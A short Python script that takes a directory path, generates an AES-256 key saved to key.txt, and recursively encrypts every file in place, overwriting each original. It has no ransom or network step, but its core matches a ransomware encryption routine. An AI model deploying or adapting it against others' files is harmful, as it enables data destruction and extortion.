# Import necessary modules
import os
from Crypto.Cipher import AES
import tkinter as tk
from tkinter import messagebox

# Define function to pad data to a multiple of 16 bytes
def pad_data(data):
    padding = 16 - (len(data) % 16)
    return data + bytes([padding] * padding)

# Define function to encrypt a file
def encrypt_file(input_file_path, key):
    # Open the input file in read mode
    with open(input_file_path, 'rb') as input_file:
        # Read the file content and pad it to a multiple of 16 bytes
        data = input_file.read()
        padded_data = pad_data(data)

        # Initialize the cipher using the key and IV
        iv = os.urandom(16)
        cipher = AES.new(key, AES.MODE_CBC, iv)

        # Write the IV and encrypted data to the input file
        with open(input_file_path, 'wb') as output_file:
            output_file.write(iv)
            encrypted_data = cipher.encrypt(padded_data)
            output_file.write(encrypted_data)

# Define function to encrypt a directory recursively
def encrypt_directory(input_dir_path, key, output_text):
    # Traverse the input directory and encrypt each file
    for root, dirs, files in os.walk(input_dir_path):
        for file_name in files:
            input_file_path = os.path.join(root, file_name)
            output_text.insert(tk.END, f"Encrypted {input_file_path}...\n")
            encrypt_file(input_file_path, key)
            #output_text.insert(tk.END, "Encrypting directory: {}\n\n".format(input_dir_path))

# Define main function to run the encryption module
def main():
    # Get input directory path from user
    input_dir_path = input("Enter the path to the input directory: ")

    # Generate a 256-bit encryption key
    key = os.urandom(32)

    # Save the key to a txt file
    with open("key.txt", "wb") as key_file:
        key_file.write(key)

    # Encrypt the directory recursively using AES encryption
    output_text = tk.Text()
    encrypt_directory(input_dir_path, key, output_text)
    

# Call the main function
if __name__ == "__main__":
    main()
